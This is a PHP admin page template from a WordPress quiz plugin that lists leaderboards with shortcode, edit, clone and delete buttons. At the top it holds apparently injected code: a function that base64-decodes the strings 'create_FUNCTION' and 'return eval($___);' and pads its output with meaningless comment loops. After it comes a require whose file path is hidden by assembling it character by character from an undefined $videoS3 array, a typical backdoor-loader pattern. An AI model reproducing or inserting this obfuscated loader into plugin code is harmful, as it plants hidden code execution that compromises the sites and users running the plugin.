<?php

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

include_once ("sqb-soapapi.php");

require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
?>

<div class="d-flex justify-content-between align-items-center mb-4" style="border-bottom: 1px solid #eee;">
    <h3 class="quiz--title m-0 border-bottom-0 "><i class="fa fa-cog" aria-hidden="true"></i> Leaderboard</h3>
</div>

<?php 
// global $wpdb,$sqb_leaderboard;
// $tableName = $wpdb->prefix . $sqb_leaderboard;
// $sql = "SELECT * FROM " . $tableName;
// $results = $wpdb->get_results( $sql);
$results = SQB_LeaderboardPage::load();

if(!empty($results)){
	?>
	<div class="member-MP--card mb-4 sqb_member_page_table_wrapper     position-relative   sqb-card-outer-gray " bis_skin_checked="1">
		<div class="alert alert-success sqb-page-delete-alert" role="alert" bis_skin_checked="1">Deleted Successfully!</div>
		<a href="<?php echo admin_url('admin.php?page=sqb_create_leaderboard_page'); ?>" class="absoluteBtn btn create--btn mp_add_new_pages_btn mb-4 d-inline-block mp_type_engagement">Create New Leaderboard</a>
		<div id="sqb_member_page_table_wrapper" class="dataTables_wrapper">
			
			<table class="table hover table-bordered table-striped sqb_member_page_table_class sqb_member_page_table_engagement " id="sqb_member_page_table" style="" attribute_table_type="single_type_page" member_page_type="engagement" role="grid" aria-describedby="sqb_member_page_table_info">
				<thead>
					<tr role="row">
					<th style="width:200px;" class="sorting" tabindex="0" rowspan="1" colspan="1" >Name</th>
					<th class="shortcode_table_th text-center sorting" tabindex="0" rowspan="1" colspan="1" style="width: 0px;">Shortcode</th>
					<th class="sqb_member_date_info text-center sorting_desc" style="width:100px;" tabindex="0" rowspan="1" colspan="1" aria-sort="descending">Date</th>
					<th style="width:50px;" class="text-center sorting" tabindex="0"rowspan="1" colspan="1" >Action</th>
					</tr>
				</thead>
				<tbody>
					<?php 

					foreach ($results as $result) {
						$id = $result->getId();
						$quiz_ids = $result->getQuizIds();
						$short_date = $result->getDate();
						if($short_date == '0000-00-00 00:00:00'){
							$shortcode_date = date('d-m-Y');
						}else{
							$shortcode_date = date('d-m-Y', strtotime($short_date));
						}
						?>
						<tr class="sqb_member_manage_page_row_id_<?php echo $id ?> odd" role="row">
							<td align="left"><?php echo $result->getName(); ?></td>
							<td align="left" class="engagement_td_shortcode">
								<div class="shortcode_table_td" bis_skin_checked="1"> <span id="eng_dynamic_copyable_text_<?php echo $id ?>">[SQBLeaderboard id=<?php echo $id ?>][/SQBLeaderboard]</span><span data-id="eng_dynamic_copyable_text_<?php echo $id ?>" id="copy_shortcode" class="copy-btn theme-button btn btn-info " onclick="sqb_leaderboard_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span></div>
							</td>
							<td align="center" class="sorting_1"><?php echo $shortcode_date; ?></td>
							<td align="center">
								<a class="btn btn-info btn-sm" href="<?php echo admin_url('admin.php?page=sqb_create_leaderboard_page&id='.$id); ?>"><i class="fa fa-pencil"></i></a>
								<a class="btn btn-warning btn-sm clone_leaderboard_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-clone"></i></a>
								<a class="btn btn-danger btn-sm delete_leaderboard_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-trash"></i></a>
							</td>
						</tr>
					<?php } ?>
				</tbody>
			</table>
			
		</div>
		</div>
	<?php
}else{
?>

<div class="member-MP--card mb-4 sqb_member_page_table_wrapper     position-relative   sqb-card-outer-gray ">
		<div class="have-no-member-pages small-member-message" > 
			<div class="empty-no-pages-section" >
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.65 28.65 0 64 0H224V128C224 145.7 238.3 160 256 160H384V198.6C310.1 219.5 256 287.4 256 368C256 427.1 285.1 479.3 329.7 511.3C326.6 511.7 323.3 512 320 512H64C28.65 512 0 483.3 0 448V64zM256 128V0L384 128H256zM288 368C288 288.5 352.5 224 432 224C511.5 224 576 288.5 576 368C576 447.5 511.5 512 432 512C352.5 512 288 447.5 288 368zM448 303.1C448 295.2 440.8 287.1 432 287.1C423.2 287.1 416 295.2 416 303.1V351.1H368C359.2 351.1 352 359.2 352 367.1C352 376.8 359.2 383.1 368 383.1H416V431.1C416 440.8 423.2 447.1 432 447.1C440.8 447.1 448 440.8 448 431.1V383.1H496C504.8 383.1 512 376.8 512 367.1C512 359.2 504.8 351.1 496 351.1H448V303.1z"></path></svg>
				<h2>You don't have any Leaderboards yet!</h2>
				<p>You can click the button to add a Leaderboard</p>
				<a href="<?php echo admin_url('admin.php?page=sqb_create_leaderboard_page'); ?>" class="manage-member-empty-btn"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add your first Leaderboard</a>
			</div>
		</div>
	</div>
</div>
<?php } ?>